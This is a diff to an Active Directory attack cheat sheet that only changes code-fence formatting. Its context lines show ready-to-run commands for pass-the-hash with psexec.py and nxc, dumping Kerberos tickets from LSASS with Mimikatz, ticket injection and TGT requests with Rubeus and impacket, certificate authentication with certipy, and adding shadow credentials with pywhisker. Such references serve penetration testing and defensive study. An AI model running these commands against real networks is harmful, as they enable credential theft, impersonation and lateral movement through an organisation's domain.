@@ -9,7 +9,7 @@ NTLM authentication uses a challenge-response protocol that only requires the ha
 
 > **UAC restriction:** For non-RID-500 local accounts, UAC remote token filtering blocks most lateral movement unless `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy` is set to 1. Domain accounts and the built-in Administrator (RID 500) are not affected.
 
-```bash
+```bash wrap
 # psexec: creates a service, gives SYSTEM, very noisy
 psexec.py $DOMAIN/$USER@$IP -hashes :$HASH
 
@@ -32,7 +32,7 @@ nxc winrm $IP -u $USER -H $HASH -x "whoami"
 
 Inject a valid Kerberos ticket into your session and authenticate as that user to any Kerberos-protected service: useful with stolen TGTs or TGSes.
 
-```powershell
+```powershell wrap
 # Mimikatz: export all tickets from LSASS
 privilege::debug
 sekurlsa::tickets /export
@@ -51,7 +51,7 @@ Rubeus.exe ptt /ticket:<base64_ticket>
 Rubeus.exe tgtdeleg /nowrap
 ```
 
-```bash
+```bash wrap
 # Linux: set ccache file and use with impacket
 export KRB5CCNAME=/path/to/ticket.ccache
 psexec.py -k -no-pass $DOMAIN/$USER@host.$DOMAIN
@@ -67,14 +67,14 @@ ticketConverter.py ticket.ccache ticket.kirbi
 
 Convert an NTLM hash into a Kerberos TGT. The resulting ticket can be used for Kerberos authentication instead of NTLM: avoids NTLM-blocked environments.
 
-```bash
+```bash wrap
 # impacket: get TGT using NTLM hash
 getTGT.py $DOMAIN/$USER -hashes :$HASH -dc-ip $IP
 export KRB5CCNAME=$USER.ccache
 psexec.py -k -no-pass $DOMAIN/$USER@host.$DOMAIN
 ```
 
-```powershell
+```powershell wrap
 # Rubeus: request TGT and inject into current session
 Rubeus.exe asktgt /user:$USER /rc4:$HASH /ptt
 
@@ -86,7 +86,7 @@ Rubeus.exe asktgt /user:$USER /rc4:$HASH /outfile:$USER.kirbi
 
 Authenticate using a certificate (PFX) instead of a password or hash. Required when you've obtained a certificate via ADCS abuse or shadow credentials and want to convert it to a usable TGT or NTLM hash.
 
-```bash
+```bash wrap
 # gettgtpkinit (Linux): get TGT from certificate
 python3 gettgtpkinit.py $DOMAIN/$USER -cert-pfx $USER.pfx -pfx-pass $PASSWORD $USER.ccache
 export KRB5CCNAME=$USER.ccache
@@ -102,7 +102,7 @@ certipy auth -pfx $USER.pfx -dc-ip $IP -no-hash
 certipy auth -pfx $USER.pfx -dc-ip $IP -ldap-shell
 ```
 
-```powershell
+```powershell wrap
 # Rubeus: request TGT with certificate and inject
 Rubeus.exe asktgt /user:administrator /certificate:$B64 /password:$PASSWORD /ptt
 
@@ -114,7 +114,7 @@ Rubeus.exe asktgt /user:administrator /certificate:$B64 /password:$PASSWORD /out
 
 If you have `WriteProperty` on `msDS-KeyCredentialLink`, add a certificate credential to the target account without changing the password.
 
-```bash
+```bash wrap
 # Add shadow credential (generates pfx + password)
 pywhisker -d $DOMAIN -u $USER -p $PASSWORD --target $TARGET --action add --dc-ip $IP
 
